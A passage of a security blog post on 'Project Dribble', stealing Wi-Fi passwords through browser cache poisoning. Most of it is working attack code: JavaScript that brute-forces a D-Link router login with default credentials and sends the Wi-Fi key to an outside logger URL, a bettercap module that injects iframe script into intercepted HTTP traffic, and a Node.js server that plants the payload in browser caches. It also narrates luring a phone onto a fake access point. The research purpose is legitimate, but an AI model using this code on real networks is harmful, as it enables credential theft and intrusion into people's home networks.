class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">// this is CryptoJS, a bit annoying to have it here</span><br><span class="line">var CryptoJS=function(h,i)&#123;var e=&#123;&#125;,f=e.lib=&#123;&#125;,l=f.Base=function()&#123;function a()&#123;&#125;return&#123;extend:function(j)&#123;a.prototype=this;var d=new a;j&amp;&amp;d.mixIn(j);d.$super=this;return d&#125;,create:function()&#123;var a=this.extend();a.init.apply(a,arguments);return a&#125;,init:function()&#123;&#125;,mixIn:function(a)&#123;for(var d in a)a.hasOwnProperty(d)&amp;&amp;(this[d]=a[d]);a.hasOwnProperty(&quot;toString&quot;)&amp;&amp;(this.toString=a.toString)&#125;,clone:function()&#123;return this.$super.extend(this)&#125;&#125;&#125;(),k=f.WordArray=l.extend(&#123;init:function(a,j)&#123;a=</span><br><span class="line">this.words=a||[];this.sigBytes=j!=i?j:4*a.length&#125;,toString:function(a)&#123;return(a||m).stringify(this)&#125;,concat:function(a)&#123;var j=this.words,d=a.words,c=this.sigBytes,a=a.sigBytes;this.clamp();if(c%4)for(var b=0;b&lt;a;b++)j[c+b&gt;&gt;&gt;2]|=(d[b&gt;&gt;&gt;2]&gt;&gt;&gt;24-8*(b%4)&amp;255)&lt;&lt;24-8*((c+b)%4);else if(65535&lt;d.length)for(b=0;b&lt;a;b+=4)j[c+b&gt;&gt;&gt;2]=d[b&gt;&gt;&gt;2];else j.push.apply(j,d);this.sigBytes+=a;return this&#125;,clamp:function()&#123;var a=this.words,b=this.sigBytes;a[b&gt;&gt;&gt;2]&amp;=4294967295&lt;&lt;32-8*(b%4);a.length=h.ceil(b/4)&#125;,clone:function()&#123;var a=</span><br><span class="line">l.clone.call(this);a.words=this.words.slice(0);return a&#125;,random:function(a)&#123;for(var b=[],d=0;d&lt;a;d+=4)b.push(4294967296*h.random()|0);return k.create(b,a)&#125;&#125;),o=e.enc=&#123;&#125;,m=o.Hex=&#123;stringify:function(a)&#123;for(var b=a.words,a=a.sigBytes,d=[],c=0;c&lt;a;c++)&#123;var e=b[c&gt;&gt;&gt;2]&gt;&gt;&gt;24-8*(c%4)&amp;255;d.push((e&gt;&gt;&gt;4).toString(16));d.push((e&amp;15).toString(16))&#125;return d.join(&quot;&quot;)&#125;,parse:function(a)&#123;for(var b=a.length,d=[],c=0;c&lt;b;c+=2)d[c&gt;&gt;&gt;3]|=parseInt(a.substr(c,2),16)&lt;&lt;24-4*(c%8);return k.create(d,b/2)&#125;&#125;,q=o.Latin1=&#123;stringify:function(a)&#123;for(var b=</span><br><span class="line">a.words,a=a.sigBytes,d=[],c=0;c&lt;a;c++)d.push(String.fromCharCode(b[c&gt;&gt;&gt;2]&gt;&gt;&gt;24-8*(c%4)&amp;255));return d.join(&quot;&quot;)&#125;,parse:function(a)&#123;for(var b=a.length,d=[],c=0;c&lt;b;c++)d[c&gt;&gt;&gt;2]|=(a.charCodeAt(c)&amp;255)&lt;&lt;24-8*(c%4);return k.create(d,b)&#125;&#125;,r=o.Utf8=&#123;stringify:function(a)&#123;try&#123;return decodeURIComponent(escape(q.stringify(a)))&#125;catch(b)&#123;throw Error(&quot;Malformed UTF-8 data&quot;);&#125;&#125;,parse:function(a)&#123;return q.parse(unescape(encodeURIComponent(a)))&#125;&#125;,b=f.BufferedBlockAlgorithm=l.extend(&#123;reset:function()&#123;this._data=k.create();</span><br><span class="line">this._nDataBytes=0&#125;,_append:function(a)&#123;&quot;string&quot;==typeof a&amp;&amp;(a=r.parse(a));this._data.concat(a);this._nDataBytes+=a.sigBytes&#125;,_process:function(a)&#123;var b=this._data,d=b.words,c=b.sigBytes,e=this.blockSize,g=c/(4*e),g=a?h.ceil(g):h.max((g|0)-this._minBufferSize,0),a=g*e,c=h.min(4*a,c);if(a)&#123;for(var f=0;f&lt;a;f+=e)this._doProcessBlock(d,f);f=d.splice(0,a);b.sigBytes-=c&#125;return k.create(f,c)&#125;,clone:function()&#123;var a=l.clone.call(this);a._data=this._data.clone();return a&#125;,_minBufferSize:0&#125;);f.Hasher=b.extend(&#123;init:function()&#123;this.reset()&#125;,</span><br><span class="line">reset:function()&#123;b.reset.call(this);this._doReset()&#125;,update:function(a)&#123;this._append(a);this._process();return this&#125;,finalize:function(a)&#123;a&amp;&amp;this._append(a);this._doFinalize();return this._hash&#125;,clone:function()&#123;var a=b.clone.call(this);a._hash=this._hash.clone();return a&#125;,blockSize:16,_createHelper:function(a)&#123;return function(b,d)&#123;return a.create(d).finalize(b)&#125;&#125;,_createHmacHelper:function(a)&#123;return function(b,d)&#123;return g.HMAC.create(a,d).finalize(b)&#125;&#125;&#125;);var g=e.algo=&#123;&#125;;return e&#125;(Math);</span><br><span class="line">(function(h)&#123;var i=CryptoJS,e=i.lib,f=e.WordArray,e=e.Hasher,l=i.algo,k=[],o=[];(function()&#123;function e(a)&#123;for(var b=h.sqrt(a),d=2;d&lt;=b;d++)if(!(a%d))return!1;return!0&#125;function f(a)&#123;return 4294967296*(a-(a|0))|0&#125;for(var b=2,g=0;64&gt;g;)e(b)&amp;&amp;(8&gt;g&amp;&amp;(k[g]=f(h.pow(b,0.5))),o[g]=f(h.pow(b,1/3)),g++),b++&#125;)();var m=[],l=l.SHA256=e.extend(&#123;_doReset:function()&#123;this._hash=f.create(k.slice(0))&#125;,_doProcessBlock:function(e,f)&#123;for(var b=this._hash.words,g=b[0],a=b[1],j=b[2],d=b[3],c=b[4],h=b[5],l=b[6],k=b[7],n=0;64&gt;</span><br><span class="line">n;n++)&#123;if(16&gt;n)m[n]=e[f+n]|0;else&#123;var i=m[n-15],p=m[n-2];m[n]=((i&lt;&lt;25|i&gt;&gt;&gt;7)^(i&lt;&lt;14|i&gt;&gt;&gt;18)^i&gt;&gt;&gt;3)+m[n-7]+((p&lt;&lt;15|p&gt;&gt;&gt;17)^(p&lt;&lt;13|p&gt;&gt;&gt;19)^p&gt;&gt;&gt;10)+m[n-16]&#125;i=k+((c&lt;&lt;26|c&gt;&gt;&gt;6)^(c&lt;&lt;21|c&gt;&gt;&gt;11)^(c&lt;&lt;7|c&gt;&gt;&gt;25))+(c&amp;h^~c&amp;l)+o[n]+m[n];p=((g&lt;&lt;30|g&gt;&gt;&gt;2)^(g&lt;&lt;19|g&gt;&gt;&gt;13)^(g&lt;&lt;10|g&gt;&gt;&gt;22))+(g&amp;a^g&amp;j^a&amp;j);k=l;l=h;h=c;c=d+i|0;d=j;j=a;a=g;g=i+p|0&#125;b[0]=b[0]+g|0;b[1]=b[1]+a|0;b[2]=b[2]+j|0;b[3]=b[3]+d|0;b[4]=b[4]+c|0;b[5]=b[5]+h|0;b[6]=b[6]+l|0;b[7]=b[7]+k|0&#125;,_doFinalize:function()&#123;var e=this._data,f=e.words,b=8*this._nDataBytes,</span><br><span class="line">g=8*e.sigBytes;f[g&gt;&gt;&gt;5]|=128&lt;&lt;24-g%32;f[(g+64&gt;&gt;&gt;9&lt;&lt;4)+15]=b;e.sigBytes=4*f.length;this._process()&#125;&#125;);i.SHA256=e._createHelper(l);i.HmacSHA256=e._createHmacHelper(l)&#125;)(Math);</span><br><span class="line">(function()&#123;var h=CryptoJS,i=h.enc.Utf8;h.algo.HMAC=h.lib.Base.extend(&#123;init:function(e,f)&#123;e=this._hasher=e.create();&quot;string&quot;==typeof f&amp;&amp;(f=i.parse(f));var h=e.blockSize,k=4*h;f.sigBytes&gt;k&amp;&amp;(f=e.finalize(f));for(var o=this._oKey=f.clone(),m=this._iKey=f.clone(),q=o.words,r=m.words,b=0;b&lt;h;b++)q[b]^=1549556828,r[b]^=909522486;o.sigBytes=m.sigBytes=k;this.reset()&#125;,reset:function()&#123;var e=this._hasher;e.reset();e.update(this._iKey)&#125;,update:function(e)&#123;this._hasher.update(e);return this&#125;,finalize:function(e)&#123;var f=</span><br><span class="line">this._hasher,e=f.finalize(e);f.reset();return f.finalize(this._oKey.clone().concat(e))&#125;&#125;)&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// check if this is a D-Link</span><br><span class="line">// This is a safe check that I put so that the payload won&#x27;t try to attack something</span><br><span class="line">// that is not a D-Link, the check could definetly be improbed but given that I</span><br><span class="line">// only have this D-Link we will have to make it due ... for now</span><br><span class="line"></span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&#x27;GET&#x27;, &#x27;http://192.168.1.1/ui/login&#x27;, true);</span><br><span class="line">xhr.setRequestHeader(&quot;hydra&quot;,&quot;true&quot;);</span><br><span class="line">xhr.onload = function () &#123;</span><br><span class="line">      if(this.response.includes(&quot;D-LINK&quot;))&#123;</span><br><span class="line">      	console.log(&quot;d-link&quot;);</span><br><span class="line">      	dlinkStart();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      &#125;;</span><br><span class="line">xhr.responseType = &#x27;text&#x27;</span><br><span class="line">xhr.send(null);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// The main function that starts the attack</span><br><span class="line">function dlinkStart()&#123;</span><br><span class="line">	// List of possible usernames</span><br><span class="line">	var usernames = [&quot;administrator&quot;,&quot;Administrator&quot;,&quot;admin&quot;,&quot;Admin&quot;];</span><br><span class="line">	// List of possible passwords</span><br><span class="line">	var passwords = [&quot;password&quot;,&quot;admin&quot;,&quot;1234&quot;,&quot;&quot;,&quot;pwd&quot;];</span><br><span class="line">	// the array containing usernames and passwords comination</span><br><span class="line">	var combos = [];</span><br><span class="line"></span><br><span class="line">	var i = 0;</span><br><span class="line"></span><br><span class="line">	// combines all possibile usernames and passwords and put it into combos</span><br><span class="line">	for(var i = 0; i &lt; usernames.length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">	     for(var j = 0; j &lt; passwords.length; j++)</span><br><span class="line">	     &#123;</span><br><span class="line">	        combos.push(&#123;&quot;user&quot;:usernames[i],&quot;pwd&quot;:passwords[j]&#125;)</span><br><span class="line">	     &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	function dlinkAttacker(user, passwd) &#123;</span><br><span class="line"></span><br><span class="line">	  // first request to get the nonce</span><br><span class="line">	  var xhr = new XMLHttpRequest();</span><br><span class="line">	  xhr.open(&#x27;GET&#x27;, &#x27;http://192.168.1.1/ui/login&#x27;, true);</span><br><span class="line">	  xhr.onload = function () &#123;</span><br><span class="line">	    if (this.readyState == XMLHttpRequest.DONE &amp;&amp; this.status == 200) &#123;</span><br><span class="line">					// the current username to test</span><br><span class="line">					var username = user</span><br><span class="line">					// the current password to test</span><br><span class="line">	      var pwd = passwd</span><br><span class="line">					// the nonce extracted from the web page</span><br><span class="line">	        var nonce = xhr.response.form.nonce.value</span><br><span class="line">					// the password encrypted with nonce</span><br><span class="line">	        var encPwd = CryptoJS.HmacSHA256(pwd, nonce)</span><br><span class="line"></span><br><span class="line">					// let&#x27;s try to log in</span><br><span class="line">	        var xhr2 = new XMLHttpRequest();</span><br><span class="line">	        xhr2.open(&#x27;POST&#x27;, &#x27;http://192.168.1.1/ui/login&#x27;, true);</span><br><span class="line"></span><br><span class="line">	        //Send the proper header information along with the request</span><br><span class="line">	        xhr2.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);</span><br><span class="line">	        xhr2.onload = function () &#123;</span><br><span class="line">	          if (this.readyState == XMLHttpRequest.DONE &amp;&amp; this.status == 200) &#123;</span><br><span class="line">	            try &#123;</span><br><span class="line">								// the comination username\password was corrent, let&#x27;s get the Wi-Fi password</span><br><span class="line">	              var wlanPsk = xhr2.response.getElementById(&#x27;wlan-psk&#x27;).innerHTML</span><br><span class="line">								// WARNING: YOU MIGHT WANT TO CHANGE WHERE THE PASSWORD ENDS UP :-)</span><br><span class="line">								var xhr3 = new XMLHttpRequest();</span><br><span class="line">								xhr3.open(&#x27;GET&#x27;,&#x27;https://rhaidiz.net/projects/dribble/dribble_logger.php?pwd&#x27;+wlanPsk);</span><br><span class="line">								xhr3.send( null );</span><br><span class="line">	            &#125; catch (e) &#123;</span><br><span class="line">	              // Wrong password, let&#x27;s try a different combination</span><br><span class="line">	              i++</span><br><span class="line">	              dlinkAttacker(combos[i].user, combos[i].pwd)</span><br><span class="line">	            &#125;</span><br><span class="line">	          &#125;</span><br><span class="line">	        &#125;</span><br><span class="line">					// the body of the login request</span><br><span class="line">	        var params = &#x27;userName=&#x27; + username + &#x27;&amp;language=IT&amp;login=Login&amp;userPwd=&#x27; + encPwd + &#x27;&amp;nonce=&#x27; + nonce</span><br><span class="line">	        xhr2.responseType = &#x27;document&#x27;</span><br><span class="line">	        xhr2.send(params);</span><br><span class="line">	    &#125;</span><br><span class="line">	  &#125;;</span><br><span class="line">	  xhr.responseType = &#x27;document&#x27;</span><br><span class="line">	  xhr.send(null);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Start the attack from the first combination of username\password</span><br><span class="line">	dlinkAttacker(combos[i].user, combos[i].pwd)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This page should be cached in client’s browser and sent as coming from the router’s IP address. Let’s now put this code aside for a moment and let’s discuss the network configuration that will allow to cache it.</p>
+<p>As I just said, the JavaScript code above will be cached as coming from the router’s IP address and will be loaded in an <code>iframe</code> that is created from another JavaScript that I inject in every JavaScript page that the client requestss in HTTP. To accomplish the interception and injection part, I use <a target="_blank" rel="noopener" href="https://www.bettercap.org/">bettercap</a>. Bettercap allows to create HTTP proxy modules that can be used to program the HTTP proxy and tell it how to behave. For instance it is possible to intercepts responses before they are delivered to the client and decide what to inject, when to inject it and how ti inject. I’ve thus created a simple code, again in JavaScript, that is loaded in bettercap and performs the injection.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// list of common router&#x27;s IP .. which definitely requires improvement</span><br><span class="line">var routers = [&quot;192.168.1.1&quot;, &quot;192.168.0.1&quot;]</span><br><span class="line"></span><br><span class="line">// this function is called when the response is </span><br><span class="line">// received and can be sent back to the client</span><br><span class="line">function onResponse(req, res) &#123;</span><br><span class="line">  // inject only responses containing JavaScript</span><br><span class="line">  if(res.ContentType.indexOf(&#x27;application/javascript&#x27;) == 0 )&#123;</span><br><span class="line">    console.log(&quot;caching&quot;);</span><br><span class="line">    console.log(req.Hostname)</span><br><span class="line">    var body = res.ReadBody();</span><br><span class="line">    // set caching header</span><br><span class="line">    res.SetHeader(&quot;Cache-Control&quot;,&quot;max-age=86400&quot;);</span><br><span class="line">    res.SetHeader(&quot;Content-Type&quot;,&quot;text/html&quot;);</span><br><span class="line">    res.SetHeader(&quot;Cache-Control&quot;,&quot;public, max-age=99936000&quot;);</span><br><span class="line">    res.SetHeader(&quot;Expires&quot;,&quot;Wed, 2 Nov 2050 10:00:00 GMT&quot;);</span><br><span class="line">    res.SetHeader(&quot;Last-Modified&quot;,&quot;Wed, 2 Nov 1988 10:00:00 GMT&quot;);</span><br><span class="line">    res.SetHeader(&quot;Access-Control-Allow-Origin:&quot;,&quot;*&quot;);</span><br><span class="line">    </span><br><span class="line">    // set payload</span><br><span class="line">    var payload = &quot;document.addEventListener(\&quot;DOMContentLoaded\&quot;, function(event)&#123;\n&quot;;</span><br><span class="line">    for(var i=0; i &lt; routers.length; i++)&#123;</span><br><span class="line">    	payload = payload + &quot;var ifrm = document.createElement(&#x27;iframe&#x27;);\nifrm.setAttribute(&#x27;src&#x27;, &#x27;http://&quot;+routers[i]+&quot;&#x27;);ifrm.style.width = &#x27;640px&#x27;;ifrm.style.height = &#x27;480px&#x27;;\ndocument.body.appendChild(ifrm);\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    payload = payload + &quot;&#125;);&quot;;</span><br><span class="line">    </span><br><span class="line">    res.Body = body + payload;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>One thing is worth noting from the code above, the JavaScript payload tries to load one <code>iframe</code> for every IP in the array <code>routers</code>. This is because the IP of the home router might have been configured differently. This means that the Raspberry has to answer to different IPs on different subnets. To do so, I simply add more IPs to the wireless interface of the Raspberry. In this way, whenever the code that loads the <code>iframe</code> is executed, a request is performed towards common routers’ IP addresses and the wireless interface of the Raspberry can pretend to be the router, answer to those requests and cache whatever I want.</p>
+<p>Finally, I need a web server on the Raspberry that listens on the wireless interface and caches the JavaScript code that attacks the router. I did some test with Nginx first, to make sure the idea was working, but finally I opted for Node.JS, mainly because I still hadn’t tried it’s HTTP server (I know).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&quot;http&quot;);</span><br><span class="line">var routers = [&quot;192.168.0.1/&quot;,&quot;192.168.1.1/&quot;,&quot;192.168.1.90/&quot;]</span><br><span class="line">var fs = require(&#x27;fs&#x27;);</span><br><span class="line">// load the index web page</span><br><span class="line">var index = fs.readFileSync(&quot;./www/index.html&quot;);</span><br><span class="line">// load the JavaScript file, which might be more than one </span><br><span class="line">// when support for other router is implemented</span><br><span class="line">var jsob = fs.readdirSync(&#x27;./www/js&#x27;);</span><br><span class="line">var repobj = &#123;&#125;</span><br><span class="line"></span><br><span class="line">for (var i in jsob)&#123;</span><br><span class="line">	// placing a / at the beginning is a bit of a lazy move</span><br><span class="line">	repobj[&quot;/&quot;+jsob[i]] = fs.readFileSync(&#x27;./www/js/&#x27; + jsob[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var server = http.createServer(function(request, response) &#123;</span><br><span class="line">	var url = request.headers.host + request.url;</span><br><span class="line">	console.log(&#x27;Request: &#x27; + url);</span><br><span class="line">	console.log(&quot;REQUEST URL&quot; + request.url);</span><br><span class="line">	console.log(request.headers);</span><br><span class="line"></span><br><span class="line">	var headers = &#123;</span><br><span class="line">		&quot;Content-Type&quot;: &quot;text/html&quot;,</span><br><span class="line">		&quot;Server&quot;: &quot;dribble&quot;,</span><br><span class="line">		&quot;Cache-Control&quot;: &quot;public, max-age=99936000&quot;,</span><br><span class="line">		&quot;Expires&quot;: &quot;Wed, 2 Nov 2050 10:00:00 GMT&quot;,</span><br><span class="line">		&quot;Last-Modified&quot;: &quot;Wed, 2 Nov 1988 10:00:00 GMT&quot;,</span><br><span class="line">		&quot;Access-Control-Allow-Origin&quot;: &quot;*&quot;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	// Cache the index page</span><br><span class="line">	if (routers.includes(url))</span><br><span class="line">	&#123;</span><br><span class="line">		console.log(&quot;cache until the end of time&quot;);</span><br><span class="line">		response.writeHead(200, headers);</span><br><span class="line">		response.write(index);</span><br><span class="line">		response.end();</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	// cache the JavaScript payload</span><br><span class="line">	else if (repobj[request.url])&#123;</span><br><span class="line">		console.log(&quot;cache JS until the end of time&quot;);</span><br><span class="line">		headers[&quot;Content-Type&quot;] = &quot;application/javascript&quot;;</span><br><span class="line">		response.writeHead(200, headers);</span><br><span class="line">		response.write(repobj[request.url]);</span><br><span class="line">		response.end();</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// listen on port 80</span><br><span class="line">server.listen(80);</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Let’s-test-it-out-…-for-real-…-almost"><a href="#Let’s-test-it-out-…-for-real-…-almost" class="headerlink" title="Let’s test it out … for real … almost!"></a>Let’s test it out … for real … almost!</h2><p>At this point I had already done some tests on my own but I wanted to try it in a more realistic environment. However, I can’t just try it on anyone without their consent, so first I needed a victim that would willingly be part of this little experiment … so I asked my girlfriend. The conversation went something like this:</p>
+<p><img src="/images/HIMYM-small.png"></p>
+<p>Great, now that I had a victim that willingly decided to participate in this little experiment, it was time to start the hack and lure her iPhone 6 to connect to my fake access point. I thus created a fake access point with an ESSID I knew she has visited before (yes, also intel on your victim can be helpful) and soon enough her iPhone connected to my fake access point.</p>
+<p>I let her browse the web while still connected to the fake access point and patiently waited for her to end up on an HTTP only web site.</p>
+<blockquote>
+<p>He waded out into the shallows,<br>and he waited there three days<br>and three nights,<br>till all manner of sea creatures<br>came acclimated to his presence.<br>And on the fourth morning, …<br><cite>Mr. Gibbs (Pirates of the Caribbean: The Curse of the Black Pearl)</cite></p>
+</blockquote>
+<p>Finally, bettercap flickered and printed that something had been injected, which meant I didn’t need to have her connected to my access point anymore.</p>
+<p><img src="/images/bettercap.png"></p>
+<p>I thus turned off my access point, causing her phone to roam to our home Wi-Fi access point and, since she was still browsing that web site, the malicious JavaScript code that got injected did its job and sent the password of my Wi-Fi network straight to my PHP page.</p>
+<p><img src="/images/final.png"></p>
+<h2 id="Wrapping-up"><a href="#Wrapping-up" class="headerlink" title="Wrapping up"></a>Wrapping up</h2><p>The whole thing is <a target="_blank" rel="noopener" href="https://github.com/rhaidiz/dribble">available in my github</a>, it can definetly be improved and, hopefully, by the time you read this it already has. Support for new routers should also be added as well. If I have the change to put my hands on other devices I will definetly add them to the repository. In the meantime, have fun and …</p>
+<div style="text-align:center;font-family:Harry;font-size:5em">mischief managed</div>
+
+</br>
+<div style="font-size:0.9em;color:#808080">
+(<a name="ack1">*</a>) Thanks to [malachias](https://www.reddit.com/user/malachias) for pointing out a mistake in this sentece ([go back](#back1)).
+</div>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://dblp.uni-trier.de/pers/hd/m/Meo:Federico_De">Academic</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-create-a-fake-access-point"><span class="toc-number">1.1.</span> <span class="toc-text">How to create a fake access point</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-force-people-to-connect-to-it"><span class="toc-number">1.2.</span> <span class="toc-text">How to force people to connect to it</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Scenario-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Scenario 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Scenario-2"><span class="toc-number">1.2.2.</span> <span class="toc-text">Scenario 2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-and-inject-the-malicious-payload"><span class="toc-number">1.3.</span> <span class="toc-text">Create and inject the malicious payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Same-Origin-Policy"><span class="toc-number">1.3.1.</span> <span class="toc-text">Same-Origin-Policy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X-Frame-Options"><span class="toc-number">1.3.2.</span> <span class="toc-text">X-Frame-Options</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Let%E2%80%99s-test-it-out-%E2%80%A6-for-real-%E2%80%A6-almost"><span class="toc-number">2.</span> <span class="toc-text">Let’s test it out … for real … almost!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wrapping-up"><span class="toc-number">3.</span> <span class="toc-text">Wrapping up</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&text=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&is_video=false&description=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Project Dribble: hacking Wi-Fi with cached JavaScript&body=Check out this article: https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&title=Project Dribble: hacking Wi-Fi with cached JavaScript"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rhaidiz.net/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/&name=Project Dribble: hacking Wi-Fi with cached JavaScript&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2022 rhaidiz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
